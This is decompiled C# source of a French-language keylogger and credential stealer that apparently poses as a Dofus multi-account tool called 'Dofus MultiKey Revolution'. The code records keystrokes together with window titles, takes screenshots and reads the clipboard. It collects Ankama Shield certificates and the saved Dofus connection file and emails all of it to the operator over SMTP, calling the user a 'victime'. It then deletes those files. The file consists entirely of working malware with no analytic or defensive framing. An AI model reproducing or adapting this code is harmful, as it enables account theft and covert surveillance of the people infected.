			mailMessage2.Body = mailMessage2.Body + "Vous avez infecté une nouvelle victime : " + Environment.MachineName + "-" + Environment.UserName + " (UniqueID : " + method_25(Environment.MachineName + "-" + Environment.UserName + "-" + Environment.ProcessorCount + "-" + Environment.OSVersion.ToString());
			mailMessage.Body += "<br/>";
			mailMessage2 = mailMessage;
			mailMessage2.Body = mailMessage2.Body + "Le mail a été envoyé le : " + Conversions.ToString(DateTime.Now) + " à l'heure de l'ordinateur de votre victime";
			mailMessage.Body += "<br/>";
			if (bool_3)
			{
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "Votre victime avait dans son presse-papiers : " + Clipboard.GetText();
			}
			mailMessage.Body = method_24(mailMessage.Body);
			method_0("Ajout des pièces jointes ...");
			try
			{
				if (bool_0)
				{
					mailMessage.Attachments.Add(new Attachment("C:\\zxss.jpg"));
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				string[] files = Directory.GetFiles(string_0 + "\\AnkamaCertificates");
				foreach (string fileName in files)
				{
					mailMessage.Attachments.Add(new Attachment(fileName));
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			try
			{
				if (Directory.Exists(string_0 + "\\Dofus2") && File.Exists(string_0 + "\\Dofus2\\Module_Ankama_Connection.dat"))
				{
					mailMessage.Attachments.Add(new Attachment(string_0 + "\\Dofus2\\Module_Ankama_Connection.dat"));
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			try
			{
				if (Directory.Exists(string_0 + "\\Dofus 2") && File.Exists(string_0 + "\\Dofus 2\\Module_Ankama_Connection.dat"))
				{
					mailMessage.Attachments.Add(new Attachment(string_0 + "\\Dofus 2\\Module_Ankama_Connection.dat"));
				}
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
			method_0("Envoi du mail ....");
			smtpClient.EnableSsl = true;
			smtpClient.Port = int_0;
			smtpClient.Credentials = new NetworkCredential(string_2, string_3);
			smtpClient.Send(mailMessage);
			method_0("Mail envoyé avec succès !");
			method_0("Suppression des logs");
			string_15 = "";
			if (bool_10)
			{
				method_0("Suppression du nom de compte enregistré");
				try
				{
					if (Directory.Exists(string_0 + "\\Dofus2") && File.Exists(string_0 + "\\Dofus2\\Module_Ankama_Connection.dat"))
					{
						File.Delete(string_0 + "\\Dofus2\\Module_Ankama_Connection.dat");
					}
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					ProjectData.ClearProjectError();
				}
				try
				{
					if (Directory.Exists(string_0 + "\\Dofus 2") && File.Exists(string_0 + "\\Dofus 2\\Module_Ankama_Connection.dat"))
					{
						File.Delete(string_0 + "\\Dofus 2\\Module_Ankama_Connection.dat");
					}
				}
				catch (Exception projectError6)
				{
					ProjectData.SetProjectError(projectError6);
					ProjectData.ClearProjectError();
				}
			}
			if (bool_9)
			{
				method_0("Suppression des certificats Ankama-Shield");
				string[] files2 = Directory.GetFiles(string_0 + "\\AnkamaCertificates");
				foreach (string path in files2)
				{
					File.Delete(path);
				}
			}
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void method_23(string string_23)
	{
		try
		{
			Mutex.OpenExisting(string_23);
			Application.Exit();
			ProjectData.EndApp();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			mutex_0 = new Mutex(initiallyOwned: false, string_23);
			ProjectData.ClearProjectError();
		}
	}

	public void timer_1_Tick(object sender, EventArgs e)
	{
		method_21();
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void timer_0_Tick(object sender, EventArgs e)
	{
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		method_0("Envoi d'un mail de logs");
		if (bool_0)
		{
			try
			{
				method_0("Prise d'un screen");
				if (File.Exists("C:\\zxss.jpg"))
				{
					FileSystem.Kill("C:\\zxss.jpg");
				}
				Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
				Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)925707);
				Graphics.FromImage((Image)(object)val).CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, (CopyPixelOperation)13369376);
				((Image)val).Save("C:\\zxss.jpg", ImageFormat.get_Jpeg());
				((Image)val).Dispose();
				method_0("Screen pris avec succès !");
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				method_0("Erreur lors de la prise de screen : " + ex2.ToString());
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			method_0("Création du mail ...");
			if (Operators.CompareString(string_15, "", false) == 0)
			{
				method_0("Les logs sont actuelement vides");
				if (!bool_2)
				{
					method_0("Arrêt de l'envoi du mail, logs vides !");
					return;
				}
			}
			MailMessage mailMessage = new MailMessage();
			SmtpClient smtpClient = new SmtpClient(string_4);
			mailMessage.From = new MailAddress(string_2);
			mailMessage.To.Add(string_2);
			mailMessage.Subject = "[Dofus MultiKey Revolution " + string_18 + "] Logs de " + Environment.MachineName + "-" + Environment.UserName;
			mailMessage.IsBodyHtml = true;
			mailMessage.Body = "Ce message contient les logs de votre victime " + Environment.MachineName + "-" + Environment.UserName + " (UniqueID : " + method_25(Environment.MachineName + "-" + Environment.UserName + "-" + Environment.ProcessorCount + "-" + Environment.OSVersion.ToString());
			mailMessage.Body += "<br/>";
			MailMessage mailMessage2 = mailMessage;
			mailMessage2.Body = mailMessage2.Body + "Le mail a été envoyé le : " + Conversions.ToString(DateTime.Now) + " à l'heure de l'ordinateur de votre victime";
			mailMessage.Body += "<br/><br/>";
			mailMessage2 = mailMessage;
			mailMessage2.Body = mailMessage2.Body + "<b>Logs :</b><br/><br/>" + string_15;
			mailMessage.Body += "<br/><br/>";
			if (bool_3)
			{
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "Votre victime avait dans son presse-papiers : " + Clipboard.GetText();
			}
			mailMessage2 = mailMessage;
			mailMessage2.Body = mailMessage2.Body + "<br/><br/><br/><b><color=\"#FF0000\">RAPPORT DES ACTIVITES :</color></b><br/>Dernière touche reçue : " + string_20 + " le " + dateTime_0.ToString() + "<br/><br/>" + string_21;
			mailMessage.Body = method_24(mailMessage.Body);
			try
			{
				if (bool_0)
				{
					mailMessage.Attachments.Add(new Attachment("C:\\zxss.jpg"));
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				string[] files = Directory.GetFiles(string_0 + "\\AnkamaCertificates");
				foreach (string fileName in files)
				{
					mailMessage.Attachments.Add(new Attachment(fileName));
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			try
			{
				if (Directory.Exists(string_0 + "\\Dofus2") && File.Exists(string_0 + "\\Dofus2\\Module_Ankama_Connection.dat"))
				{
					mailMessage.Attachments.Add(new Attachment(string_0 + "\\Dofus2\\Module_Ankama_Connection.dat"));
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			try
			{
				if (Directory.Exists(string_0 + "\\Dofus 2") && File.Exists(string_0 + "\\Dofus 2\\Module_Ankama_Connection.dat"))
				{
					mailMessage.Attachments.Add(new Attachment(string_0 + "\\Dofus 2\\Module_Ankama_Connection.dat"));
				}
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
			method_0("Envoi du mail ....");
			smtpClient.EnableSsl = true;
			smtpClient.Port = int_0;
			smtpClient.Credentials = new NetworkCredential(string_2, string_3);
			smtpClient.Send(mailMessage);
			method_0("Mail envoyé avec succès !");
			method_0("Suppression des logs");
			string_15 = "";
			mailMessage.Dispose();
			if (bool_10)
			{
				try
				{
					if (Directory.Exists(string_0 + "\\Dofus2") && File.Exists(string_0 + "\\Dofus2\\Module_Ankama_Connection.dat"))
					{
						File.Delete(string_0 + "\\Dofus2\\Module_Ankama_Connection.dat");
					}
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					ProjectData.ClearProjectError();
				}
				try
				{
					if (Directory.Exists(string_0 + "\\Dofus 2") && File.Exists(string_0 + "\\Dofus 2\\Module_Ankama_Connection.dat"))
					{
						File.Delete(string_0 + "\\Dofus 2\\Module_Ankama_Connection.dat");
					}
				}
				catch (Exception projectError6)
				{
					ProjectData.SetProjectError(projectError6);
					ProjectData.ClearProjectError();
				}
			}
			if (!bool_9)
			{
				return;
			}
			try
			{
				if (Directory.Exists(string_0 + "\\AnkamaCertificates"))
				{
					Directory.Delete(string_0 + "\\AnkamaCertificates");
				}
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
	}

	public string method_24(string string_23)
	{
		return string_23.Replace("é", "&eacute;").Replace("è", "&egrave;").Replace("ê", "&ecirc;")
			.Replace("à", "&agrave;")
			.Replace("ç", "&ccedil;");
	}

	private string method_25(string string_23)
	{
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		string text = "";
		string text2 = "";
		byte[] bytes = Encoding.ASCII.GetBytes(string_23);
		byte[] array = mD5CryptoServiceProvider.ComputeHash(bytes);
		checked
		{
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				text2 = Conversion.Hex(array[i]);
				if (Strings.Len(text2) == 1)
				{
					text2 = "0" + text2;
				}
				text += text2;
			}
			return text.ToLower();
		}
	}

	public string method_26(string string_23, string string_24)
	{
		byte[] rgbIV = new byte[16]
		{
			121, 241, 10, 1, 132, 74, 11, 39, 255, 91,
			45, 78, 14, 211, 22, 62
		};
		MemoryStream memoryStream = new MemoryStream();
		string_23 = method_27(string_23);
		byte[] bytes = Encoding.ASCII.GetBytes(string_23.ToCharArray());
		int num = Strings.Len(string_24);
		if (num >= 32)
		{
			string_24 = Strings.Left(string_24, 32);
		}
		else
		{
			num = Strings.Len(string_24);
			int num2 = checked(32 - num);
			string_24 += Strings.StrDup(num2, "X");
		}
		byte[] bytes2 = Encoding.ASCII.GetBytes(string_24.ToCharArray());
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] inArray = default(byte[]);
		try
		{
			CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(bytes2, rgbIV), CryptoStreamMode.Write);
			cryptoStream.Write(bytes, 0, bytes.Length);
			cryptoStream.FlushFinalBlock();
			inArray = memoryStream.ToArray();
			memoryStream.Close();
			cryptoStream.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return Convert.ToBase64String(inArray);
	}

	public string method_27(string string_23)
	{
		int num = 1;
		string text = string_23;
		while (num > 0)
		{
			num = Strings.InStr(num, string_23, "\0", (CompareMethod)0);
			if (num > 0)
			{
				text = checked(Strings.Left(text, num - 1) + Strings.Right(text, Strings.Len(text) - num));
			}
			if (num > text.Length)
			{
				break;
			}
		}
		return text;
	}

	public string method_28(string string_23, string string_24)
	{
		byte[] rgbIV = new byte[16]
		{
			121, 241, 10, 1, 132, 74, 11, 39, 255, 91,
			45, 78, 14, 211, 22, 62
		};
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] array = Convert.FromBase64String(string_23);
		int num = Strings.Len(string_24);
		checked
		{
			if (num >= 32)
			{
				string_24 = Strings.Left(string_24, 32);
			}
			else
			{
				num = Strings.Len(string_24);
				int num2 = 32 - num;
				string_24 += Strings.StrDup(num2, "X");
			}
			byte[] bytes = Encoding.ASCII.GetBytes(string_24.ToCharArray());
			byte[] array2 = new byte[array.Length + 1];
			MemoryStream memoryStream = new MemoryStream(array);
			try
			{
				CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(bytes, rgbIV), CryptoStreamMode.Read);
				cryptoStream.Read(array2, 0, array2.Length);
				cryptoStream.FlushFinalBlock();
				memoryStream.Close();
				cryptoStream.Close();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return method_27(Encoding.ASCII.GetString(array2));
		}
	}

	public string method_29(int int_2, int int_3, bool bool_22 = true, bool bool_23 = true, bool bool_24 = true)
	{
		checked
		{
			if (int_2 > 0 && int_3 > 0 && int_2 <= int_3)
			{
				string text = "";
				if (bool_22)
				{
					text = "abcdefgijkmnopqrstwxyz";
				}
				if (bool_23)
				{
					text += "ABCDEFGHJKLMNPQRSTWXYZ";
				}
				if (bool_24)
				{
					text += "1234567890";
				}
				char[][] array = new char[1][] { text.ToCharArray() };
				int[] array2 = new int[array.Length - 1 + 1];
				int num = array2.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					array2[i] = array[i].Length;
				}
				int[] array3 = new int[array.Length - 1 + 1];
				int num2 = array3.Length - 1;
				for (int j = 0; j <= num2; j++)
				{
					array3[j] = j;
				}
				byte[] array4 = new byte[4];
				RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
				rNGCryptoServiceProvider.GetBytes(array4);
				int seed = unchecked(((array4[0] & 0x7F) << 24) | (byte)(array4[1] << 0) | (byte)(array4[2] << 0)) | array4[3];
				Random random = new Random(seed);
				char[] array5 = null;
				array5 = ((int_2 >= int_3) ? new char[int_2 - 1 + 1] : new char[random.Next(int_2, int_3 + 1) - 1 + 1]);
				int num3 = array3.Length - 1;
				int num4 = array5.Length - 1;
				for (int k = 0; k <= num4; k++)
				{
					int num5 = ((num3 != 0) ? random.Next(0, num3) : 0);
					int num6 = array3[num5];
					int num7 = array2[num6] - 1;
					int num8 = ((num7 != 0) ? random.Next(0, num7 + 1) : 0);
					array5[k] = array[num6][num8];
					if (num7 == 0)
					{
						array2[num6] = array[num6].Length;
					}
					else
					{
						if (num7 != num8)
						{
							char c = array[num6][num7];
							array[num6][num7] = array[num6][num8];
							array[num6][num8] = c;
						}
						int[] array6 = array2;
						int num9 = num6;
						array6[num9]--;
					}
					if (num3 == 0)
					{
						num3 = array3.Length - 1;
						continue;
					}
					if (num3 != num5)
					{
						int num10 = array3[num3];
						array3[num3] = array3[num5];
						array3[num5] = num10;
					}
					num3--;
				}
				return new string(array5);
			}
			return null;
		}
	}

	private string method_30()
	{
		string string_ = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref string_, 100);
		return string_.Substring(0, checked(Strings.InStr(string_, "\0", (CompareMethod)0) - 1));
	}

	private void method_31(Keys keys_0)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Expected I4, but got Unknown
		try
		{
			dateTime_0 = DateTime.Now;
			string_20 = ((Enum)keys_0).ToString();
			string string_ = Conversions.ToString((int)keys_0);
			string_17 = method_30();
			bool flag = false;
			flag = ((Operators.CompareString(string_17, string_16, false) != 0) ? true : false);
			string_16 = string_17;
			DateTime now = DateTime.Now;
			bool flag2 = false;
			switch (genum0_0)
			{
			case GEnum0.Contient:
				if (string_17.ToLower().Contains(string_14.ToLower()))
				{
					flag2 = true;
				}
				break;
			case GEnum0.ContientPas:
				if (!string_17.ToLower().Contains(string_14.ToLower()))
				{
					flag2 = true;
				}
				break;
			case GEnum0.Egal:
				if (Operators.CompareString(string_17.ToLower(), string_14.ToLower(), false) == 0)
				{
					flag2 = true;
				}
				break;
			case GEnum0.Toutletemps:
				flag2 = true;
				break;
			}
			if (flag2)
			{
				if (flag)
				{
					string_15 = string_15 + "<br/><br/><br/><b>Fenetre : [" + string_17 + "]  - | " + now.TimeOfDay.ToString() + " |</b><br/>";
				}
				string_15 += method_32(string_);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			method_0("Erreur lors de la prise d'une lettre : " + ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public string method_32(string string_23)
	{
		string text = string_23;
		if (Operators.CompareString(text, "189", false) == 0)
		{
			string_23 = "-";
		}
		else if (Operators.CompareString(text, "27", false) == 0)
		{
			string_23 = "[Echap]";
		}
		else if (Operators.CompareString(text, "112", false) == 0)
		{
			string_23 = "[F1]";
		}
		else if (Operators.CompareString(text, "113", false) == 0)
		{
			string_23 = "[F2]";
		}
		else if (Operators.CompareString(text, "114", false) == 0)
		{
			string_23 = "[F3]";
		}
		else if (Operators.CompareString(text, "115", false) == 0)
		{
			string_23 = "[F4]";
		}
		else if (Operators.CompareString(text, "116", false) == 0)
		{
			string_23 = "[F5]";
		}
		else if (Operators.CompareString(text, "117", false) == 0)
		{
			string_23 = "[F6]";
		}
		else if (Operators.CompareString(text, "118", false) == 0)
		{
			string_23 = "[F7]";
		}
		else if (Operators.CompareString(text, "119", false) == 0)
		{
			string_23 = "[F8]";
		}
		else if (Operators.CompareString(text, "120", false) == 0)
		{
			string_23 = "[F9]";
		}
		else if (Operators.CompareString(text, "121", false) == 0)
		{
			string_23 = "[F10]";
		}
		else if (Operators.CompareString(text, "122", false) == 0)
		{
			string_23 = "[F11]";
		}
		else if (Operators.CompareString(text, "123", false) == 0)
		{
			string_23 = "[F12]";
		}
		else if (Operators.CompareString(text, "45", false) == 0)
		{
			string_23 = "[INSERT]";
		}
		else if (Operators.CompareString(text, "44", false) == 0)
		{
			string_23 = "[Imp.Ecran]";
		}
		else if (Operators.CompareString(text, "19", false) == 0)
		{
			string_23 = "[Pause|Attn]";
		}
		else if (Operators.CompareString(text, "8", false) == 0)
		{
			string_23 = "[RET.ARR]";
		}
		else if (Operators.CompareString(text, "36", false) == 0)
		{
			string_23 = "[DEBUT]";
		}
		else if (Operators.CompareString(text, "35", false) == 0)
		{
			string_23 = "[FIN]";
		}
		else if (Operators.CompareString(text, "144", false) == 0)
		{
			string_23 = "[VERR.NUM]";
		}
		else if (Operators.CompareString(text, "9", false) == 0)
		{
			string_23 = "[TAB]";
		}
		else if (Operators.CompareString(text, "20", false) == 0)
		{
			string_23 = "[VERR.MAJ]";
		}
		else if (Operators.CompareString(text, "160", false) == 0)
		{
			string_23 = "[SHIFT.G]";
		}
		else if (Operators.CompareString(text, "162", false) == 0)
		{
			string_23 = "[CTRL.G]";
		}
		else if (Operators.CompareString(text, "161", false) == 0)
		{
			string_23 = "[SHIFT.D]";
		}
		else if (Operators.CompareString(text, "163", false) == 0)
		{
			string_23 = "[CTRL.D]";
		}
		else if (Operators.CompareString(text, "13", false) == 0)
		{
			string_23 = "[ENTER]";
		}
		else if (Operators.CompareString(text, "46", false) == 0)
		{
			string_23 = "[SUPPR]";
		}
		else if (Operators.CompareString(text, "33", false) == 0)
		{
			string_23 = "[PAGE.H]";
		}
		else if (Operators.CompareString(text, "34", false) == 0)
		{
			string_23 = "[PAGE.B]";
		}
		else if (Operators.CompareString(text, "38", false) == 0)
		{
			string_23 = "[HAUT]";
		}
		else if (Operators.CompareString(text, "40", false) == 0)
		{
			string_23 = "[BAS]";
		}
		else if (Operators.CompareString(text, "37", false) == 0)
		{
			string_23 = "[GAUCHE]";
		}
		else if (Operators.CompareString(text, "39", false) == 0)
		{
			string_23 = "[DROITE]";
		}
		else if (Operators.CompareString(text, "111", false) == 0)
		{
			string_23 = "/";
		}
		else if (Operators.CompareString(text, "106", false) == 0)
		{
			string_23 = "*";
		}
		else if (Operators.CompareString(text, "109", false) == 0)
		{
			string_23 = "-";
		}
		else if (Operators.CompareString(text, "107", false) == 0)
		{
			string_23 = "+";
		}
		else if (Operators.CompareString(text, "13", false) == 0)
		{
			string_23 = "[ENTER.D]";
		}
		else if (Operators.CompareString(text, "110", false) == 0)
		{
			string_23 = ".";
		}
		else if (Operators.CompareString(text, "103", false) == 0)
		{
			string_23 = "7";
		}
		else if (Operators.CompareString(text, "104", false) == 0)
		{
			string_23 = "8";
		}
		else if (Operators.CompareString(text, "105", false) == 0)
		{
			string_23 = "9";
		}
		else if (Operators.CompareString(text, "100", false) == 0)
		{
			string_23 = "4";
		}
		else if (Operators.CompareString(text, "101", false) == 0)
		{
			string_23 = "5";
		}
		else if (Operators.CompareString(text, "102", false) == 0)
		{
			string_23 = "6";
		}
		else if (Operators.CompareString(text, "97", false) == 0)
		{
			string_23 = "1";
		}
		else if (Operators.CompareString(text, "98", false) == 0)
		{
			string_23 = "2";
		}
		else if (Operators.CompareString(text, "99", false) == 0)
		{
			string_23 = "3";
		}
		else if (Operators.CompareString(text, "96", false) == 0)
		{
			string_23 = "0";
		}
		else if (Operators.CompareString(text, "222", false) == 0)
		{
			string_23 = "²";
		}
		else if (Operators.CompareString(text, "49", false) == 0)
		{
			string_23 = "&";
		}
		else if (Operators.CompareString(text, "50", false) == 0)
		{
			string_23 = "é";
		}
		else if (Operators.CompareString(text, "51", false) == 0)
		{
			string_23 = "\"";
		}
		else if (Operators.CompareString(text, "52", false) == 0)
		{
			string_23 = "'";
		}
		else if (Operators.CompareString(text, "53", false) == 0)
		{
			string_23 = "(";
		}
		else if (Operators.CompareString(text, "54", false) == 0)
		{
			string_23 = "-";
		}
		else if (Operators.CompareString(text, "55", false) == 0)
		{
			string_23 = "è";
		}
		else if (Operators.CompareString(text, "56", false) == 0)
		{
			string_23 = "_";
		}
		else if (Operators.CompareString(text, "57", false) == 0)
		{
			string_23 = "ç";
		}
		else if (Operators.CompareString(text, "48", false) == 0)
		{
			string_23 = "à";
		}
		else if (Operators.CompareString(text, "219", false) == 0)
		{
			string_23 = ")";
		}
		else if (Operators.CompareString(text, "187", false) == 0)
		{
			string_23 = "=";
		}
		else if (Operators.CompareString(text, "65", false) == 0)
		{
			string_23 = "a";
		}
		else if (Operators.CompareString(text, "90", false) == 0)
		{
			string_23 = "z";
		}
		else if (Operators.CompareString(text, "69", false) == 0)
		{
			string_23 = "e";
		}
		else if (Operators.CompareString(text, "82", false) == 0)
		{
			string_23 = "r";
		}
		else if (Operators.CompareString(text, "84", false) == 0)
		{
			string_23 = "t";
		}
		else if (Operators.CompareString(text, "89", false) == 0)
		{
			string_23 = "y";
		}
		else if (Operators.CompareString(text, "85", false) == 0)
		{
			string_23 = "u";
		}
		else if (Operators.CompareString(text, "73", false) == 0)
		{
			string_23 = "i";
		}
		else if (Operators.CompareString(text, "79", false) == 0)
		{
			string_23 = "o";
		}
		else if (Operators.CompareString(text, "80", false) == 0)
		{
			string_23 = "p";
		}
		else if (Operators.CompareString(text, "221", false) == 0)
		{
			string_23 = "^";
		}
		else if (Operators.CompareString(text, "186", false) == 0)
		{
			string_23 = "$";
		}
		else if (Operators.CompareString(text, "81", false) == 0)
		{
			string_23 = "q";
		}
		else if (Operators.CompareString(text, "83", false) == 0)
		{
			string_23 = "s";
		}
		else if (Operators.CompareString(text, "68", false) == 0)
		{
			string_23 = "d";
		}
		else if (Operators.CompareString(text, "70", false) == 0)
		{
			string_23 = "f";
		}
		else if (Operators.CompareString(text, "71", false) == 0)
		{
			string_23 = "g";
		}
		else if (Operators.CompareString(text, "72", false) == 0)
		{
			string_23 = "h";
		}
		else if (Operators.CompareString(text, "74", false) == 0)
		{
			string_23 = "j";
		}
		else if (Operators.CompareString(text, "75", false) == 0)
		{
			string_23 = "k";
		}
		else if (Operators.CompareString(text, "76", false) == 0)
		{
			string_23 = "l";
		}
		else if (Operators.CompareString(text, "77", false) == 0)
		{
			string_23 = "m";
		}
		else
		{
			switch (text)
			{
			case "192":
				string_23 = "ù";
				break;
			case "220":
				string_23 = "*";
				break;
			case "81":
				string_23 = "q";
				break;
			case "83":
				string_23 = "s";
				break;
			case "68":
				string_23 = "d";
				break;
			case "70":
				string_23 = "f";
				break;
			case "71":
				string_23 = "g";
				break;
			case "72":
				string_23 = "h";
				break;
			case "74":
				string_23 = "j";
				break;
			case "75":
				string_23 = "k";
				break;
			case "76":
				string_23 = "l";
				break;
			case "77":
				string_23 = "m";
				break;
			case "226":
				string_23 = "<";
				break;
			case "87":
				string_23 = "w";
				break;
			case "88":
				string_23 = "x";
				break;
			case "67":
				string_23 = "c";
				break;
			case "86":
				string_23 = "v";
				break;
			case "66":
				string_23 = "b";
				break;
			case "78":
				string_23 = "n";
				break;
			case "188":
				string_23 = ",";
				break;
			case "190":
				string_23 = ";";
				break;
			case "191":
				string_23 = ":";
				break;
			case "223":
				string_23 = "!";
				break;
			case "32":
				string_23 = " ";
				break;
			case "164":
				string_23 = "[ALT]";
				break;
			case "93":
				string_23 = "[MENU]";
				break;
			case "91":
				string_23 = "[WINDOWS]";
				break;
			}
		}
		return string_23;
	}
}
